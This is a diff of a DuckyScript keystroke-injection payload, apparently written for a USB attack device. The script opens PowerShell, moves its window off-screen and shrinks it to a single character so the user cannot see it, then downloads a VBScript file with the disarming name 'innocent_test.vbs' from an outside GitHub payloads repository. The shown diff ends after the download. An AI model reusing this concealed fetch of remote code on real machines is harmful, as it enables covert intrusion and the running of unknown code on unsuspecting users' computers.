@@ -7,20 +7,14 @@ ALT D
 DELAY 20
 STRINGLN POWERSHELL.exe 
 DELAY 200
-STRINGLN [console]::WindowHeight=10
-STRINGLN [console]::WindowWidth=10
 ALT SPACE
 STRING m
 LEFTARROW
-REPEAT 30
-STRINGLN [console]::WindowHeight=5
-STRINGLN [console]::WindowWidth=5
-ALT SPACE
-STRING m
-LEFTARROW
-REPEAT 10
-STRINGLN [console]::WindowHeight=1
-STRINGLN [console]::WindowWidth=1
+REPEAT 50
+STRING [console]::WindowHeight=1
+ENTER
+STRING [console]::WindowWidth=1
+ENTER
 DELAY 200
 STRINGLN Invoke-WebRequest -Uri https://raw.githubusercontent.com/Fred-the-bot/payloads/main/innocent_test.vbs -OutFile .\innocent.vbs
 DELAY 1000
